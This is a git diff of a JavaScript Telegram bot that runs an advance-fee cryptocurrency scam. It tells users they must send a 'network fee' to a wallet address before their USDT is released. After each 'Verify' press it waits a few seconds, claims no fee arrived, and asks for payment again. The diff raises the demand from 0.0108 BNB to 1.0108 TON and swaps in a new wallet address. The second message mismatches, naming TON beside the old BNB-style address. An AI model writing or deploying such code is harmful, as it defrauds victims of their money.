@@ -37,7 +37,7 @@ bot.on('text', async (ctx) => {
     }
 
     if (text === '✅ Confirm') {
-        return ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
+        return ctx.reply(`📃 Please send 1.0108 Ton as network fee for withdraw your USDT funds.\n\nAddress :- UQAGu8dbpHzjFmy7GtZXg4fuchEU4X1-WVDlNkOHWBiIRMwr\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
         Markup.keyboard([['☑️ Verify']]).resize());
     }
 
@@ -46,7 +46,7 @@ bot.on('text', async (ctx) => {
         setTimeout(() => {
             ctx.reply('❎ We haven\'t received transaction fee.');
             setTimeout(() => {
-                ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
+                ctx.reply(`📃 Please send 1.0108 Ton as network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
                 Markup.keyboard([['☑️ Verify']]).resize());
             }, 1000);
         }, 3000);
@@ -80,3 +80,4 @@ app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
     bot.launch();
 });
+
